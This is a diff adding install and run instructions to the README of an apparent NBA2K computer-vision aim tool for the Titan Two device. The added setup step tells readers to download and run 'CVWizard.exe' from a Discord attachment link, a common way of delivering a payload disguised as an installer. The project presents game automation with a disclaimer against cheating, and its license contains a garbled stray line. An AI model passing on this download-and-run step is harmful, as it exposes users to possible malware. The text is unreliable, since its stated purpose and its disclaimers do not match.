@@ -100,3 +100,61 @@ Clone the repo:
 ```sh
 git clone https://github.com/yourusername/TitanLabs-NBA2K-CVEngine.git
 cd TitanLabs-NBA2K-CVEngine
+
+
+🛠 Install Requirements
+
+To simplify setup, download and run the TitanLabs CV Environment Wizard:
+
+🔗 CVWizard.exe
+https://cdn.discordapp.com/attachments/1436502322740990163/1436503019628925170/CVWizard.exe?ex=691fa930&is=691e57b0&hm=1d1ea5e84cfc058dc0131414df27df41ed6d15298a90569d933b33b2eb32faba&
+
+This will automatically install:
+
+Python environment
+
+OpenCV
+
+PyQt6
+
+Numpy
+
+Required TitanLabs dependencies
+
+▶️ Running the Engine
+
+Use the official TitanLabs package loader:
+
+🔗 Helios II
+https://helios.inputsense.com/api/package.php
+
+Run your TitanLabs GCVWorker script directly through Helios or your Titan Two environment.
+
+⚠️ Disclaimer
+
+This project is published for research, learning, and computer vision experimentation only.
+
+TitanLabs does not support:
+
+Online game cheating
+
+Abuse of automation in competitive or online play
+
+Modifying this project to bypass anti-cheat or detection systems
+
+Use this software responsibly and within all applicable Terms of Service.
+
+🔐 License
+
+TitanLabs (TL v1.0)
+© 2025 TitanLabs — All Rights Reserved
+
+This source code may be viewed, studied, and modified for personal, non-commercial, educational use only.
+
+Bypass, strip, or modify the security system
+
+This software is provided “as is” with no warranty of any kind SUPPORT WILL BE GIVEN TO ALL https://discord.gg/titan-labs.
+
+🏆 Credits
+Mell
+Discord Community For Testing Along The Way!
